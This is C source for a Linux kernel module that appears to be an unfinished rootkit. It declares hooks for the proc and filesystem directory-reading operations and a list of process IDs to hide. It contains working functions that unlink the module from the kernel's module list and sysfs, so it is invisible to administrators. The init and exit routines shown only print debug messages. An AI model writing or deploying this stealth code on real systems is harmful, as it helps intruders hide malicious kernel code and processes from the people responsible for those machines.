#include <linux/init.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/fs.h>

#define DEBUG_ENABLED 1
#define MAX_PIDS 512

MODULE_LICENSE("Dual BSD/GPL");

#if defined(DEBUG_ENABLED) && DEBUG_ENABLED == 1
    # define DEBUG(...)		printk(KERN_INFO __VA_ARGS__)
#else
    # define DEBUG(...)
#endif

/*
* STATIC VARIABLES SECTION
* we don't want to have it visible in kallsyms and have access to it all the time
*/
static struct proc_dir_entry *proc_next;
static struct proc_dir_entry *proc_rk;

static int (*proc_readdir_orig)(struct file *f, void *, filldir_t);
static int (*fs_readdir_orig)(struct file *f, void *, filldir_t);

static filldir_t proc_filldir_orig;
static filldir_t fs_filldir_orig;

static struct file_operations *proc_fops;
static struct file_operations *fs_fops;

static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

static char pids_to_hide[MAX_PIDS][8];
static int current_pid = 0;

static char hide_files = 1;
static char module_hidden = 0;
static char module_status[1024];

/* MODULE HELPERS */
void module_hide(void) {
    if(module_hidden) return;
    list_del(&THIS_MODULE->list);
    module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
    kobject_del(&THIS_MODULE->mkobj.kobj);
    list_del(&THIS_MODULE->mkobj.kobj.entry);
    module_hidden = !module_hidden;
}

void module_show(void) {
    int result;
    if(!module_hidden) return;
    list_add(&THIS_MODULE->list, module_previous);
    result=kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");
    module_hidden = !module_hidden;
}

/* MODULE EXIT/INIT */
static int __init rk_init(void) {
    DEBUG("Initializing module");
    return 0;
}

static int __exit rk_exit(void) {
    DEBUG("Cleanup module");
    return 0;
}

module_init(rk_init);
module_exit(rk_exit);